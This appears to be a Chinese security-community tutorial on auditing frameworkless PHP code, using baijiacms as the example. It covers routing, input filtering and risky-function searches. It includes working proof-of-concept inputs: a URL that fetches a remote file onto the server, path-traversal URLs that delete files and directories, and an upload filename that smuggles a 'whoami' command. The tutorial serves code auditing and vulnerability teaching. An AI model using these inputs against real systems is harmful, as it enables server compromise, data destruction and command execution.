

# 奇安信攻防社区-PHP无框架代码审计

### PHP无框架代码审计

本文主要以baijiacms为例分享一些PHP无框架代码审计的思路

## 0x00 审计环境

```php
phpstudy(php5.6.27+Apache+mysql)
Windows10 64位 
PHPStorm
```

将源码放到WWW目录，访问/install.php安装即可  
![1.png](assets/1704791760-c279a3a01fd39d2de8a5a406a8635e05.png)

## 0x01 目录结构

开始审计前，先看一下目录结构，判断是否使用框架开发，常见的框架如Thinkphp、Laravel、Yii等都有比较明显的特征  
![2.png](assets/1704791760-9b264c82585866358acc40ac5c6ea7f3.png)

判断没有用框架，就先搞清楚目录结构、路由。主要关注以下几个方面：

1）入口文件index.php：根目录下的index.php文件是一个程序的入口，通常会包含整个程序的运行流程、包含的文件，所以通读一下index.php文件有助于我们了解整个程序的运行逻辑

2）安全过滤文件：安全过滤文件中会写函数对参数进行过滤，所以了解程序过滤的漏洞，对于我们进行漏洞利用至关重要。这类文件通常会在其他文件中包含，所以一般会在特定的目录，如上面的includes目录下。另外，找这类文件，也可以从其他文件包含的文件去看

3）函数集文件：函数集文件中会写一些公共的函数，方便其他文件对该函数进行调用，所以这类文件也会在其他文件中进行包含。这类文件通常会存放在common或function等文件夹中

### 1、入口文件index.php分析

首先检查/config/install.link文件是否存在，如果不存在就重定向到install.php进行安装  
![3.png](assets/1704791760-a49ea91e5215afa6828800d9cdf6fa0f.png)

然后通过条件判断来确定 $mod 的值，然后跟进 $mod 的值定义`SYSTEM_ACT`常量  
![4.png](assets/1704791760-305b2885591bd5d7b98bc0c9afade9ea.png)

接着根据是否传入参数do和act来确定参数的值  
![5.png](assets/1704791760-e7333541724fefc63244e3f93a92b187.png)

在最后包含includes/baijiacms.php

### 2、安全过滤分析

跟进到includes/baijiacms.php查看，一开始定义一些常量  
![6.png](assets/1704791760-c660b109c247d7ec06a96e7df5068967.png)

随后发现该文件中定义了一个irequestsplite函数  
![7.png](assets/1704791760-46ec52952d07d369d4c66b5a7fcd538c.png)

irequestsplite()函数主要是用htmlspecialchars()将预定义字符（&、<、>、"、'）转换为HTML实体，防止XSS。92行对$\_GP调用irequestsplite()处理，即对GET和POST传入的数据都进行处理  
![8.png](assets/1704791760-74fadc47c07718daae2e121ef85d989e.png)

### 3、路由分析

路由信息可通过全局搜索route关键字，到写了路由配置的文件中查看

如果在文件中没有找到，可以访问网站，查看url，结合url中的参数和文件目录及文件名进行理解  
![9.png](assets/1704791760-5a4a535041c38e1d849e943f52a3b5dc.png)

在登录页面，可以看到四个参数mod、act、do、beid，这里主要关注前三个，将这三个变量接收的参数在网站目录的文件中寻找  
![10.png](assets/1704791760-d889305a499946227da700532c838d01.png)

可以看到接收的值和标记的文件目录文件名一样，index.php调用了page，查看一下  
![11.png](assets/1704791760-e8cf7aae02d742f785890fadfd1e5f4c.png)

会调用/template/mobile/目录下的index.php文件  
![12.png](assets/1704791760-17835206919c080d6308f499da8e7587.png)

确认是正确对应，act代表目录名，mod代表目录名，do代表文件名

登录后台页面，查看url，site、manager、store三个参数  
![13.png](assets/1704791760-96f939a55ee5dc0289bd7fffb710ea2a.png)

继续看网站目录的文件，发现web目录不符合  
![14.png](assets/1704791760-4455bf04d27b26aebe6e8f96601755c6.png)

尝试修改mod值为web，发现可正常访问  
![15.png](assets/1704791760-6879c59c2d98e7bd8e06093d2c185b12.png)

至此了解了网站路由，且所有接收参数都是system目录下的文件中，所以我们可以重点看该目录下的文件。

## 0x02 代码审计

审计代码可以从两个方向出发：

-   从功能点进行审计，通过浏览网页，寻找可能存在漏洞的功能点，然后找到相对应的源码进行审计
-   从代码方向进行审计，通过全局搜索危险函数，审计相关函数的参数是否可控，来审计是否存在漏洞

### 1、sql注入审计

主要注意执行sql语句的地方参数是否用户可控，是否使用了预编译

可以全局搜索select等sql语句关键词，然后定位到具体的语句，然后查看里面有没有拼接的变量；也可以浏览网页，找具有查询功能的地方，定位到文件参数，审计是否存在漏洞

浏览网页，发现搜索功能  
![16.png](assets/1704791760-76f1b4c4843066b9fbd002dc439b46f8.png)

根据url定位到文件\\system\\manager\\class\\web\\store.php，抓包发现接收参数为sname，搜索sname  
![17.png](assets/1704791760-f08a8b867e2a31a774c717e2bb2356ea.png)

`$_GP['sname']`接收我们输入的参数并使用单引号包裹拼接到SQL语句中，只看这里很明显存在sql注入

但是在前面看全局过滤的时候，知道对传参使用`htmlspecialchars()`函数进行处理，会将单引号转换成html实体，而此处需要单引号闭合，所以不存在sql注入

### 2、文件上传/文件写入审计

审计文件上传/写入漏洞，主要需要关注是否对文件类型、文件大小、上传路径、文件名等进行了限制。

有的项目，会将文件上传下载功能封装到一个自定义函数中，所以可以全局搜索upliad、file的函数，看看是否有自定义的函数。

也可以直接搜索`move_uploaded_file`、`file_put_contents`函数，判断参数是否可控。

全局搜索`move_uploaded_file`，发现两处调用  
![18.png](assets/1704791760-5368481c3ab99ded5f70c3be8068af61.png)

在excel.php中，检查文件后缀是否为xlsx，无法上传，看第二处common.inc.php文件  
![19.png](assets/1704791760-f8a5059c440efb43d851549f14187f66.png)

在`file_move`自定义函数中使用了`move_uploaded_file`函数，移动上传的文件，跟进`file_move`  
![20.png](assets/1704791760-69cfb9e0bcf8c1b191b47780b644315d.png)

在`file_save`函数中调用，继续跟进`file_save`，找到4处调用，逐个审计，发现只有一处对文件后缀没有限制  
![21.png](assets/1704791760-b006844df29e6502d6bb03593a260358.png)

`fetch_net_file_upload`函数中，通过 $url 获取文件名，存到 $extention ，然后经过拼接取得上传路径，利用`file_put_content`函数上传文件，然后调用`file_save`将上传的文件移动到新的位置

该函数中没有对上传后缀、上传大小等做限制，很显然会存在文件上传。  
接着搜索哪里调用了`fetch_net_file_upload`，找到一处调用  
![22.png](assets/1704791760-5281aeb25a0eb0502b82bafab4c4ca3e.png)

可以发现上传的数据通过url参数传入，传参方式为$\_GPC，等同与$\_GP  
![23.png](assets/1704791760-dae188f82859f0a60fb7493e7202d45c.png)

所以可以通过url传入远程恶意文件地址，达到文件写入的目的

##### 漏洞验证

根据文件路径构造url  
`/index.php?mod=web&act=public&do=file&op=fetch&url=http://远程IP/info.php`

![24.png](assets/1704791760-22e52967273aba72b0a7208b354d9365.png)

访问该路径，成功写入

![25.png](assets/1704791760-656ec762c149bf67c1de6dd5fb9a01dc.png)

### 3、任意文件删除审计

审计任意文件删除，需要注意是否存在`../`、`.`、`..\`等跨目录的字符过滤，是否配置了路径等

文件删除主要搜索`unlink`、`rmdir`函数，unlink 用于删除文件，rmdir用于删除文件夹

#### 任意文件删除一

全局搜索unlink，在common.inc.php中写了一个`file_delete`函数中调用了unlink删除文件  
![26.png](assets/1704791760-e3e74077d8573700bdb0a9ad00bed94c.png)

寻找`file_delete`调用的地方，看参数可控处审计  
![27.png](assets/1704791760-0d405385c56cff2633c25b418aad3238.png)

在`/system/eshop/coe/mobie/util/uploader.php`中，调用`file_delete`删除文件，且参数可控

##### 漏洞验证：

在根目录下创建一个aaa.txt，构造url删除  
![28.png](assets/1704791760-04c33a896e23ea6c6d7990202505f723.png)

`/index.php?mod=mobile&do=util&act=uploader&m=eshop&op=remove&file=../aaa.txt`

![29.png](assets/1704791760-7fa92ff76548cc202ab2b2d6d2309e43.png)

![30.png](assets/1704791760-a5d5d7635ea65c9d1b1fc41562bf6c50.png)

成功删除

#### 任意文件删除二

common.inc.php中的rmdirs函数同样调用了unlink函数，并且发现还调用了rmdir函数  
![31.png](assets/1704791760-c55190f3cc1bb4d87ab9f30bd96b7827.png)

首先用`is_dir`判断传入的参数是否是一个目录，如果是，并且不是/cache/目录，就调用rmdir删除目录；如果不是，则调用unink删除文件

全局搜索`rmdirs`，在`/system/manager/class/web/database.php`找到一处调用  
![32.png](assets/1704791760-1a65dd95ba4f7d4b972871b73c5b5561.png)

通过id传入参数并base64解码，然后传入判断是一个目录，则调用rmdirs，这里限制了只能删除一个目录

##### 漏洞验证：

在根目录创建一个test目录，构造url删除，将`../../test`进行base64编码传入id  
`/index.php?mod=web&act=manager&do=database&op=delete&id=Li4vLi4vdGVzdA==`

![33.png](assets/1704791760-36adadc4ffae04aa3f4db28950de8b57.png)

成功删除

### 4、命令执行审计

命令执行可以全局搜索一切可以执行命令的函数，如`exec、passthru、proc_open、shell_exec、system、pcntl_exec、popen`等，审计参数是否可控

全局搜索这些函数，找到在common.inc.php文件中存在一处file\_save函数调用system()  
![34.png](assets/1704791760-42c173334bffe1c4a96abddf069a80b6.png)

当`$settings['image_compress_openscale']`非空的时候，就会调用system()，参数拼接的，其中`$file_full_path`是通过函数传入的第四个参数

搜索`image_compress_openscale`的值  
![35.png](assets/1704791760-c73aee34174eff01ea1166b77d978aac.png)

可以看到是通过$\_GP传入进行设置，发数据包设置为非空即可

接下来寻找`file_save`函数调用的地方，主要关注第四个参数是否可控即可，在`/system/weixin/class/web/setting.php`中找到一处调用  
![36.png](assets/1704791760-d11409d9879276bbc20e939ceed18225.png)

可以看到第四个参数是根目录路径加上`$fie['name']`

![37.png](assets/1704791760-530ea0f3a579ba0edc98475905d69c1b.png)

`$fie['name']`来源于`$_FILES['weixin_verify_file']`为用户可控，构造文件名即可执行命令，后续会检查后缀是否为txt

##### 漏洞验证：

定位到漏洞存在路径  
`/index.php/?mod=web&act=weixin&do=setting`  
![38.png](assets/1704791760-96a307b5e57e59f125697f623b4d51b3.png)

上传文件抓包，修改文件名（因为前面会拼接路径，所以需要用&进行分割）  
`filename="&whoami&.txt"`

![39.png](assets/1704791760-dc8c131bea384c7fb6607fc0f986a410.png)

## 0x03 总结

这篇文章涉及到的漏洞并不多，但是其他的漏洞审计也是差不多，搜索可能产生漏洞的函数，检查过滤是否到位，参数是否可控等。
